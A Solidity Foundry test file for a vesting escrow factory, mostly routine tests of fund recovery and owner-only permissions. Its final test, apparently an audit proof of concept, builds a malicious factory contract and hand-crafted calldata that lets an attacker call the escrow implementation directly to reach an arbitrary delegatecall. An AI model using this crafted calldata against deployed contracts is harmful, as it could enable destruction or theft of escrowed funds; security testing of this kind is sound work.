// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.23;

import {TestUtil} from 'test/lib/TestUtil.sol';
import {ERC20Token} from 'test/lib/ERC20Token.sol';
import {console2 as console} from 'forge-std/Test.sol';

contract SelfDestruct {
    function delegate(bytes memory params) public {
        //selfdestruct call: in foundry is not possible to show the effects of `selfdestruct` because the results only take effect when a call is done.
    }
}

contract MaliciousFactory {
    address sd;
    constructor() {
        sd = address(new SelfDestruct());
    }
    function votingAdaptor() public returns (address) {
        return address(sd);
    }
}


contract VestingEscrowFactoryTest is TestUtil {
    function setUp() public {
        setUpProtocol(ProtocolConfig({owner: address(1), manager: address(2)}));
        deployVestingEscrow(
            VestingEscrowConfig({
                amount: 1 ether,
                recipient: address(this),
                vestingDuration: 365 days,
                vestingStart: uint40(block.timestamp),
                cliffLength: 90 days,
                isFullyRevokable: true,
                initialDelegateParams: new bytes(0)
            })
        );
    }

    function testRecoverERC20() public {
        ERC20Token token2 = new ERC20Token();
        address _owner = factory.owner();

        token2.mint(address(factory), amount);

        uint256 ownerBalance = token2.balanceOf(_owner);

        factory.recoverERC20(address(token2), amount);

        assertEq(token2.balanceOf(_owner), amount + ownerBalance);
        assertEq(token2.balanceOf(address(factory)), 0);
    }

    function testRecoverEther() public {
        vm.deal(address(factory), 1 ether);
        assertEq(address(factory).balance, 1 ether);

        address _owner = factory.owner();
        uint256 ownerBalance = address(_owner).balance;

        factory.recoverEther();

        assertEq(address(_owner).balance, ownerBalance + 1 ether);
        assertEq(address(factory).balance, 0);
    }

    function testSendEtherReverts() public {
        vm.deal(address(factory), 1 ether);
        assertEq(address(factory).balance, 1 ether);

        vm.prank(RANDOM_GUY);
        (bool success,) = address(factory).call{value: 1 ether}(new bytes(0));
        assertEq(success, false);
    }

    function testUpdateVotingAdaptorFromNonOwnerReverts() public {
        vm.prank(RANDOM_GUY);
        vm.expectRevert();
        factory.updateVotingAdaptor(address(1));
    }

    function testChangeManagerFromNonOwnerReverts() public {
        vm.prank(RANDOM_GUY);
        vm.expectRevert();
        factory.changeManager(address(1));
    }

    
    function testArbitraryDelegateCall() public {
    address maliciousFactory = address(new MaliciousFactory());
    address vestingEscrowImpl = factory.vestingEscrowImpl();

    address attacker = makeAddr("attacker");

    bytes memory craftedCalldata = abi.encodePacked(

        //CALLDATA FOR FUNCTION `delegate(bytes)`
        hex"0ccfac9e", //fn selector of `delegate(bytes)`
        hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000", //`bytes params of delegate(bytes)`
        
        //MALICIOUS CALLDATA
        address(maliciousFactory), //address: malicious factory
        hex"0000000000000000000000000000000000000000", //address: OZVotingToken address
        address(attacker), //address: recipient
        hex"0000000000", //uint40: starttime
        hex"0000000000", //uint40: endttime
        hex"0000000000", //uint40: cliffLength
        hex"0000000000000000000000000000000000000000000000000000000000000000", //uint256: totalLocked
        hex"006d" //2 bytes for data length

    );

    vm.prank(attacker);
    (bool success, bytes memory data) = vestingEscrowImpl.call(craftedCalldata);
    require(success);
}
}
